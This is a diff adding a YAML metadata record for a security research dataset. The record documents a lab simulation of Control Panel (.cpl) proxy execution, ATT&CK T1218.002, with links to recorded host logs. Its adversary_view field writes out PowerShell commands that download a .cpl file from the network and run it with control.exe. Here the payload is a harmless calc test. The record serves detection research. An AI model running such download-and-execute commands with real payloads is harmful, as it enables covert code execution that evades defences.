@@ -1,0 +1,32 @@
+title: Control Panel Execution
+id: SDWIN-201022013121
+author: Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2020/10/22
+modification_date: 2020/10/22
+platform: Windows
+tags:
+  - art.037e9d8a-9e46-4255-8b33-2ae3b545ca6f
+description: This dataset represents threat actors leveraging control.exe to execute a .cpl file to proxy execute another payload (i.e. calc).
+attack_mappings:
+  - technique: T1218
+    sub-technique: "002"
+    tactics:
+      - TA0005
+notebooks:
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/host/psh_control_panel_execution.zip
+simulation:
+  environment: Lab VM
+  tools:
+    - type: Manual
+      name: powershell
+      module: powershell
+      script: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.002/T1218.002.md#atomic-test-1---control-panel-items
+  permissions_required:
+    - Administrator
+  adversary_view: |-
+    Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.002/bin/calc.cpl" -OutFile C:\ProgramData\calc.cpl
+    control.exe C:\ProgramData\calc.cpl
+references:
+  - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.002/T1218.002.md#atomic-test-1---control-panel-items
